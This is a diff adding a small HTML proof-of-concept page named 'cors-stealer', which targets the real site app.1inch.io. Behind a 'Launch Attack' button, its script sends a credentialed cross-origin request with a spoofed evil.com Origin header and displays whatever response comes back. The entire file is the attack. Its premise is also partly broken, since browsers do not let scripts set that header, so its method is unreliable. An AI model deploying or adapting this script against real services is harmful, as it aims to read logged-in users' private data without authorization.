@@ -1,1 +1,44 @@
+<!-- Filename: cors-stealer.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS Exploit PoC</title>
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+    #result { white-space: pre-wrap; background: #000; padding: 15px; border: 1px solid #0f0; margin-top: 10px; }
+  </style>
+</head>
+<body>
+  <h1>💀 CORS Exploit PoC</h1>
+  <p>Target: <code>https://app.1inch.io</code></p>
+  <button onclick="exploit()">🚀 Launch Attack</button>
+  <div id="result">Waiting...</div>
 
+  <script>
+    async function exploit() {
+      const target = 'https://app.1inch.io/';
+      const resultBox = document.getElementById('result');
+      resultBox.textContent = 'Sending CORS request to ' + target + '...\n';
+
+      try {
+        const res = await fetch(target, {
+          method: 'GET',
+          mode: 'cors',
+          credentials: 'include', // try include cookies
+          headers: {
+            'Origin': 'https://evil.com' // simulate evil.com origin
+          }
+        });
+
+        resultBox.textContent += `Status: ${res.status}\n`;
+
+        const text = await res.text();
+        resultBox.textContent += `\n--- Response Content ---\n${text.substring(0, 2000)}...`; // cap to 2000 chars
+      } catch (err) {
+        resultBox.textContent += '\n❌ Exploit Failed:\n' + err;
+      }
+    }
+  </script>
+</body>
+</html>
